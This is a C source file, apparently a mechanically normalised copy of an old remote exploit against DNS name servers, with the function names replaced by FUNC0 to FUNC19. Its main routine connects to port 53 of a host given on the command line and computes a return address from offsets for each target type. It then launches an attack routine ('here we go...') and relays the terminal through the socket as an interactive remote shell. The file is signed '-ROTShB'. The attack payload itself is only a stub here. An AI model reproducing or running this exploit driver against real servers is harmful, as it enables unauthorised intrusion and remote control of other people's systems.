#define NULL ((void*)0)
typedef unsigned long size_t;  // Customize by platform.
typedef long intptr_t; typedef unsigned long uintptr_t;
typedef long scalar_t__;  // Either arithmetic or pointer type.
/* By default, we understand bool (as a convenience). */
typedef int bool;
#define false 0
#define true 1

/* Forward declarations */
typedef  struct TYPE_5__   TYPE_2__ ;
typedef  struct TYPE_4__   TYPE_1__ ;

/* Type definitions */
typedef  int /*<<< orphan*/  ybuf ;
typedef  int /*<<< orphan*/  xbuf ;
struct TYPE_5__ {int /*<<< orphan*/  s_addr; } ;
struct sockaddr_in {TYPE_2__ sin_addr; int /*<<< orphan*/  sin_family; int /*<<< orphan*/  sin_port; } ;
struct sockaddr {int dummy; } ;
typedef  int /*<<< orphan*/  sa ;
typedef  int /*<<< orphan*/  fd_set ;
struct TYPE_4__ {int addr; int opt_addr; char* desc; int fd; } ;

/* Variables and functions */
 int /*<<< orphan*/  AF_INET ; 
 unsigned long DEFAULT_ANBUF_OFFSET ; 
 int DEFAULT_OPTIMIZATION ; 
 int DEFAULT_TARGET ; 
 scalar_t__ FUNC0 (int,int /*<<< orphan*/ *) ; 
 int /*<<< orphan*/  FUNC1 (int,int /*<<< orphan*/ *) ; 
 int /*<<< orphan*/  FUNC2 (int /*<<< orphan*/ *) ; 
 int /*<<< orphan*/  SOCK_STREAM ; 
 void* FUNC3 (char*) ; 
 int FUNC4 (int,TYPE_1__,unsigned long,int) ; 
 int FUNC5 (int) ; 
 int FUNC6 (int,struct sockaddr*,int) ; 
 int /*<<< orphan*/  FUNC7 (int) ; 
 int FUNC8 (int /*<<< orphan*/ ) ; 
 int /*<<< orphan*/  FUNC9 (int /*<<< orphan*/ ,char*,...) ; 
 int /*<<< orphan*/  FUNC10 (int) ; 
 char* FUNC11 (TYPE_2__) ; 
 int /*<<< orphan*/  FUNC12 (char*) ; 
 int /*<<< orphan*/  FUNC13 (char*,...) ; 
 int FUNC14 (int,char*,int) ; 
 int /*<<< orphan*/  FUNC15 (char*) ; 
 int FUNC16 (int,int /*<<< orphan*/ *,int /*<<< orphan*/ *,int /*<<< orphan*/ *,int /*<<< orphan*/ *) ; 
 int FUNC17 (int /*<<< orphan*/ ,int /*<<< orphan*/ ,int /*<<< orphan*/ ) ; 
 int /*<<< orphan*/  stderr ; 
 int /*<<< orphan*/  stdin ; 
 int /*<<< orphan*/  stdout ; 
 TYPE_1__* target ; 
 int FUNC18 (int,char*,int) ; 

int FUNC19(int argc, char *argv[])
{
  char xbuf[128], ybuf[128];
  unsigned long offset=DEFAULT_ANBUF_OFFSET;
  int ti, opt=DEFAULT_OPTIMIZATION, sock, i;
  int xlen=0, ylen=0;
  fd_set rd, wr;
  struct sockaddr_in sa;

  for(i=0;((target[i].addr)||(target[i].opt_addr));i++);

  if(argc<2)
    {
      (void)FUNC9(stderr,"\ntarget types:\n");

      for(ti=0;ti<i;ti++)
        (void)FUNC9(stderr," %-2d : %s\n",ti,target[ti].desc);

      (void)FUNC9(stderr,"\nerror: usage: %s <host> [tt] [opt] [ofst]\n",
                    argv[0]);
      FUNC7(-1);
    }

  if(argc>2)
    {
      ti = FUNC3(argv[2]);
      if((ti<0)||(ti>i))
        {
          (void)FUNC9(stderr,"error: invalid target type %d\n",ti);
          FUNC7(-1);
        }
    }
  else
    ti = DEFAULT_TARGET;

  if(argc>3)
    {
      opt = FUNC3(argv[3]);
      if((opt!=0)&&(opt!=1))
        {
          (void)FUNC9(stderr,"error: invalid optimization setting %d\n",opt);
          FUNC7(-1);
        }
    }

  if(argc>4)
    offset = FUNC3(argv[4]);


  if(!(sa.sin_addr.s_addr=FUNC15(argv[1])))
    {
      (void)FUNC9(stderr,"error: can not resolve: %s\n",argv[1]);
      FUNC7(-1);
    }

  sa.sin_family = AF_INET;
  sa.sin_port   = FUNC10(53);

  if((sock=FUNC17(sa.sin_family,SOCK_STREAM,0))==(-1))
    {
      (void)FUNC12("error: socket");
      FUNC7(-1);
    }

  if(FUNC6(sock,(struct sockaddr *)&sa,sizeof(sa))==(-1))
    {
      (void)FUNC12("error: connect");
      FUNC7(-1);
    }

  (void)FUNC13("target             : %s\n",FUNC11(sa.sin_addr));
  (void)FUNC13("target type        : %s\n",target[ti].desc);
  (void)FUNC13("optimized named    : %s\n",(opt?"YES":"NO"));
  (void)FUNC13("anbuff addr        : 0x%x\n",(unsigned int)
               (i=(opt?target[ti].opt_addr:target[ti].addr)));
  (void)FUNC13("anbuff addr offset : %lu\n",offset);
  (void)FUNC13("ret addr           : 0x%x\n",(unsigned int)(i+offset));
  (void)FUNC13("fd to make dups of : %d\n",target[ti].fd);

  (void)FUNC13("here we go...\n");

  switch(FUNC4(sock,target[ti],offset,opt))
    {
    case -1:
      (void)FUNC12("error: attack");
      FUNC7(-1);
      break;

    case 0:
      (void)FUNC9(stderr,"error: internal error\n");
      FUNC7(-1);
      break;
    }

  (void)FUNC13("have fun.\n");
  (void)FUNC13("-ROTShB\n");

  while(1)
    {
      FUNC2(&rd);
      if(ylen<(sizeof(ybuf)-1))
        FUNC1(sock,&rd);
      if(xlen<(sizeof(xbuf)-1))
        FUNC1(FUNC8(stdin),&rd);

      FUNC2(&wr);
      if(xlen)
        FUNC1(sock,&wr);
      if(ylen)
        FUNC1(FUNC8(stdout),&wr);

      if((ti=FUNC16((sock+1),&rd,&wr,NULL,NULL))==(-1))
        {
          (void)FUNC12("error: select");
          break;
        }

      if(FUNC0(FUNC8(stdin),&rd))
        {
          if((i=FUNC14(FUNC8(stdin),(xbuf+xlen),(sizeof(xbuf)-xlen)))==(-1))
            {
              (void)FUNC12("error: read");
              FUNC7(-1);
            }
          else if(i==0)
            break;

          xlen += i;
          if(!(--ti)) continue;
        }


      if(FUNC0(sock,&wr))
        {
          if(FUNC18(sock,xbuf,xlen)!=xlen)
            {
              (void)FUNC12("error: write");
              FUNC7(-1);
            }

          xlen = 0;
          if(!(--ti)) continue;
        }

      if(FUNC0(sock,&rd))
        {
          if((i=FUNC14(sock,(ybuf+ylen),(sizeof(ybuf)-ylen)))==(-1))
            {
              (void)FUNC12("error: read");
              FUNC7(-1);
            }
          else if(i==0)
            break;

          ylen += i;
          if(!(--ti)) continue;
        }

      if(FUNC0(FUNC8(stdout),&wr))
        {
          if(FUNC18(FUNC8(stdout),ybuf,ylen)!=ylen)
            {
              (void)FUNC12("error: write");
              FUNC7(-1);
            }

          ylen = 0;
          if(!(--ti)) continue;
        }
    }

  if(FUNC5(sock)==(-1))
    {
      (void)FUNC12("error: close");
      FUNC7(-1);
    }

  FUNC7(0);
}